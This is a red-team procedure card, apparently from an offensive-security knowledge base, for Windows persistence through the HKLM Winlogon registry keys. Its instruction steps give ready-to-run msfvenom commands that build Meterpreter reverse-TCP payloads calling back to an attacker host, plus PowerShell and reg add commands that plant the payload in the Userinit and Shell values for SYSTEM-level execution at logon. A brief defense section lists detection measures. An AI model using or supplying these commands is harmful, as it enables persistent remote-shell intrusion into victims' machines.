---
id: 8ed32d30-ebfe-4c9c-ae61-06aaf981da2a
name: windows-registry-hklm-winlogon-persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:28.022255+00:00'
updated_at: '2023-04-10T20:37:21.582308+00:00'
tactics:
  - '[[Persistence]]'
  - '[[Privilege-Escalation-via-Direct-URL-Access]]'
techniques:
  - '[[Registry Run Keys - Startup Folder]]'
sub_techniques: []
tags:
  - elevated
  - registry-hklm
  - windows-persistence
  - winlogon
commands:
  - '[[commands/create-meterpreter-reverse-tcp-payloads]]'
  - '[[commands/set-winlogon-userinit-and-shell-powershell]]'
platforms:
  - Windows
tools: []
validated: true
---

# windows-registry-hklm-winlogon-persistence

## Summary

This procedure establishes persistence on a Windows system by generating Meterpreter reverse shell payloads using msfvenom and modifying the Winlogon registry keys (Userinit and Shell) to execute the malicious executable at system boot or user logon, providing SYSTEM-level access to the attacker upon reboot.

## Description

The technique leverages Windows startup mechanisms by appending a malicious executable to the Userinit and Shell registry values under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon. Although the procedure generates both EXE and DLL payloads, the DLL is not directly used in the registry modification here; the EXE is prepended to the existing values to ensure execution during boot or logon processes. This allows an attacker with initial elevated access to maintain a backdoor that connects back to a listener, evading basic detection if the payload is not whitelisted. It is effective in enterprise environments where systems reboot periodically, but requires administrative privileges to write to HKLM.

## Requirements

1. Administrator or SYSTEM-level privileges on the target Windows machine to modify HKLM registry.
2. Metasploit Framework (msfvenom) available on the attacker's or target's system (if executing remotely).
3. Write access to a directory (e.g., %TEMP%) for saving payload files.
4. Network connectivity from the target to the attacker's listener IP and port.

## Defense

- Monitor registry modifications to HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon using tools like Sysmon or Windows Audit Policy (Event ID 4657).
- Implement application whitelisting with AppLocker or Windows Defender Application Control to block unsigned executables from running at startup.
- Scan for anomalous files (e.g., evilbinary.exe) in system directories and network connections to unexpected hosts.

## Objectives

1. Create reverse shell payloads for remote access.
2. Inject persistence mechanism into Winlogon startup keys.
3. Ensure execution with elevated privileges on system reboot or logon.

## Instructions

### Step 1: Generate Meterpreter Payloads

**Context**: Use msfvenom to create portable EXE and DLL payloads configured for reverse TCP connection. This step prepares the malicious binaries that will be referenced in the registry. The EXE will be used for persistence, while the DLL can be adapted for other techniques like DLL hijacking.

**Command** ([[commands/create-meterpreter-reverse-tcp-payloads]]):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f exe > $_OUTPUT_EXE
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_LHOST LPORT=$_LPORT -f dll > $_OUTPUT_DLL
```

This command invokes msfvenom twice to generate the payloads. Replace placeholders with actual values (e.g., LHOST=attacker_ip). Run this on a system with Metasploit installed, such as Kali Linux, and transfer the files to the target if needed.

### Step 2: Modify Winlogon Registry Keys

**Context**: Update the Userinit and Shell registry values to append the malicious EXE, ensuring it runs alongside legitimate processes at boot or logon. This requires PowerShell execution on the target; an equivalent CMD alternative using 'reg add' can be used if PowerShell is restricted.

**Command** ([[commands/set-winlogon-userinit-and-shell-powershell]]):
```powershell
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "userinit.exe, $_MALICIOUS_EXE" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, $_MALICIOUS_EXE" -Force
```

Execute this in an elevated PowerShell session on the target. The -Force flag overwrites existing values without prompting. Verify changes with 'Get-ItemProperty' afterward. Alternative CMD: `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "userinit.exe, $_MALICIOUS_EXE" /f` (repeat for Shell with "explorer.exe, $_MALICIOUS_EXE").
